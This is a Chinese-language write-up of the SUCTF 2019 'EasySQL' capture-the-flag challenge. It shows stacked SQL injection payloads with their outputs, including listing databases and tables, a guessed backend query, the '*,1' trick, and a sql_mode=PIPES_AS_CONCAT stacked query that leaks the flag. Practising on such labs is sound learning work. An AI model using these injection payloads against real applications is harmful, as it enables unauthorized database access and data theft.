# EasySQL

[题目地址](https://buuoj.cn/challenges#[SUCTF%202019]EasySQL)

有点菜了。

进到网站，显示的信息让我以为真就是要我猜flag。

- Give me your flag, I will tell you if the flag is right.

打算爆破，结果发现输入字母根本就没有回显。只有输入数字才会有var_dump类型输出。

- Array ( [0] => 1 )

找了篇[wp](https://blog.csdn.net/mochu7777777/article/details/108937396),用fuzz测试了过滤的内容。只过滤了几个sql的关键词，符号什么的基本没管。尝试堆叠注入。

- 1;show databases;
  > Array ( [0] => 1 ) Array ( [0] => ctf ) Array ( [0] => ctftraining ) Array ( [0] => information_schema ) Array ( [0] => mysql ) Array ( [0] => performance_schema ) Array ( [0] => test )

去ctf里面看看。

- 1;use ctf;show tables;
  > Array ( [0] => 1 ) Array ( [0] => Flag )

[use](https://www.yiibai.com/sql/sql-select-database.html)语句用于选择数据库。然后我就不会了。看大佬说，这里的query参数无论我们输入数字什么都只会回显Array([0]= > 1)，输入字母不会显，但是也没显示是过滤的，所以query的值如果为非数字则无法正确查询得到数据回显，那么查询语句就应该长这样

```php
$sql="select".$_POST['query']." || flag from Flag";
```

这里||的用法是或。网上搜大部分搜到的都是连接符，所以我也不是很了解或的用法。看wp里面的演示，我认为假如使用或的两个被查询内容有相同的字符，就返回1；否则返回0。在猜到查询语句后，我们可以这么构造payload。

- *,1
  > Array ( [0] => flag{49d4de96-6872-4c94-a7f6-d5f96ced5f2f} [1] => 1 )

这个payload会让语句成为：

```php
$sql="select *,1 || flag from Flag";
```

逗号作为查询内容的分割，select * from Flag是第一个，select 1 || flag from Flag是第二个。第一个返回的内容都很熟悉，第二个返回什么已经不重要了，flag已经出来了。

还有另一种方法。堆叠注入功能强大，我们甚至可以利用[sql_mode](https://blog.csdn.net/qq_41453285/article/details/117690689)改配置。

```sql
set sql_mode=PIPES_AS_CONCAT
```

这样能把||设置为连接符而不是逻辑或。于是我们再查询时就能把flag带出来了。

- 1;set sql_mode=PIPES_AS_CONCAT;select 1
  > Array ( [0] => 1 ) Array ( [0] => 1flag{49d4de96-6872-4c94-a7f6-d5f96ced5f2f} )

语句变为：

```php
$sql="select 1;set sql_mode=PIPES_AS_CONCAT;select 1 || flag from Flag";
```

由于改成了连接符，select 1 || flag from Flag效果就变成了select 1 from Flag的查询结果和select flag from Flag的查询结果的拼接。

### Flag
- flag{49d4de96-6872-4c94-a7f6-d5f96ced5f2f}